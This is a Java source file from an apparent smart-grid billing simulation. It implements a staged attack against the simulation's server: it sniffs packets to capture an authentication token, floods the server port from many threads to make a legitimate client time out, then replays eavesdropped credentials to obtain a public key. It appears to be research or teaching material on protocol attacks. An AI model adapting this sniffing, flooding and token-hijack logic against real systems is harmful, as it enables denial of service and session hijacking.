package SmartGridBillingSenario.attack;

import SmartGridBillingSenario.message.AuthenticationMessage;
import SmartGridBillingSenario.message.Message;
import SmartGridBillingSenario.message.MessageType;
import SmartGridBillingSenario.socket.SocketClient;
import SmartGridBillingSenario.utils.Utils;
import lombok.extern.slf4j.Slf4j;
import org.pcap4j.packet.Packet;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

import static SmartGridBillingSenario.utils.Utils.getTcpValue;

/**
 * Created by ydai on 18/10/17.
 */
@Slf4j
public class Dos extends Pcap4j {

    private int threadNumber;

    private String serverhost;
    private int trePort;
    private int thisPort = 0;

    private String token;

    private List<DdosThread> ddosThreadList;

    //The attacker eavesdrop the username/password beforehand;
    private String username = "pp";
    private String password = "password";

    public Dos(int threadNumber, String serverhost, int portNumber) {
        super(serverhost);
        this.threadNumber = threadNumber;
        this.serverhost = serverhost;
        this.trePort = portNumber;
        ddosThreadList = new ArrayList<>();
    }


    private void attack() {
        log.info("Start ddos attack, with threadNumber = {}", threadNumber);
        for (int i = 0; i < threadNumber; i++) {
            DdosThread thread = new DdosThread(serverhost, trePort);
            ddosThreadList.add(thread);
            log.info("add one thread, total thread {}", ddosThreadList.size());
            thread.start();
        }
    }

    @Override
    public void handleTcpData(String srcAddr, String dstAddr, String srcPort, String dstPort, Packet payload) {

        if (Integer.valueOf(srcPort) == trePort && Integer.valueOf(dstPort) != thisPort) {
            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired for TRE, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);
                    //get encrypte value from PP use it own private key to resolve it
                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_GET_TOKEN)) {
                        token = String.valueOf(message.getObject());
                        log.info("HAHA!! Get TOKEN from TRE {}, start DDOS Attack", token);
                        attack();

                        //wait for 10s to make PP to TRE connection timeout.
                        Thread.sleep(8000);
                        stopAttack();
                        log.info("Finish DDOS attack, TRE missed info from PP");
                        startConnectWithToken(username, password);
                    } else if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST)) {
                        log.info("HAHA, Attack Successful!! Get Public Key!!! {}", message.getObject());
                    }
                } catch (Exception e) {
                    return;
                }
            }
        }
    }

    private void stopAttack() {
        for (DdosThread thread : ddosThreadList) {
            thread.stopAttack();
            thread.interrupt();
        }
    }

    private class DdosThread extends Thread {
        private AtomicBoolean running = new AtomicBoolean(true);

        private SocketClient socketClient;

        public DdosThread(String host, int portNumber) {
            socketClient = new SocketClient(host, portNumber);
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    socketClient.sendToPort(Utils.messageToString(new Message(MessageType.DDOS, "DDOS ATTACK!!!")));
                } catch (Exception e) {
                }

            }
        }

        public void stopAttack() {
            running.set(false);
        }
    }

    private void startConnectWithToken(String userName, String password) {
        log.info("Start trying to connect to TRE");
        AuthenticationMessage authenticationMessage = new AuthenticationMessage(token, userName, password);
        try {
            String jsonInString = Utils.messageToString(new Message(MessageType.ATTESTATION_REQUEST, authenticationMessage));
            ddosThreadList.get(0).socketClient.sendToPort(jsonInString);
        } catch (Exception e) {
        }

    }

}
